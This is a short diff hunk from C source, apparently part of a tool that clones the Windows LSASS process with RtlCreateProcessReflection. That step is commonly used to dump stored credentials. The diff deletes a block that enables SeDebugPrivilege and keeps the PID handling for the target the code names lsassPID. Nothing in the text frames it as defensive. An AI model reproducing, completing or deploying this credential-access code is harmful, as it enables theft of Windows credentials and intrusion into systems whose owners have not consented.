@@ -114,32 +114,6 @@ NTSTATUS Clone(HANDLE pid) {
       (RtlCreateProcessReflection_t)get_function_from_exports(
           ntdll, "RtlCreateProcessReflection");
 
-  // if (!RtlCreateProcessReflection) {
-  //   printf("failed to resolve RtlCreateProcessReflection\n");
-  //   return 1;
-  // }
-
-  // elevate privileges
-  HANDLE hToken;
-  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,
-                        &hToken)) {
-    printf("OpenProcessToken failed: %d\n", GetLastError());
-    return 1;
-  }
-  TOKEN_PRIVILEGES tokenPriv;
-  LUID luid;
-  LookupPrivilegeValue(NULL, "SeDebugPrivilege", &luid);
-  tokenPriv.PrivilegeCount = 1;
-  tokenPriv.Privileges[0].Luid = luid;
-  tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-  AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES),
-                        NULL, NULL);
-  // if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
-  //   printf("SeDebugPrivilege not assigned — run as admin\n");
-  //   return 1;
-  // }
-  CloseHandle(hToken);
-
   // resolve PID from input handle
   DWORD lsassPID = (DWORD)(uintptr_t)pid;
   if (lsassPID == 0) {
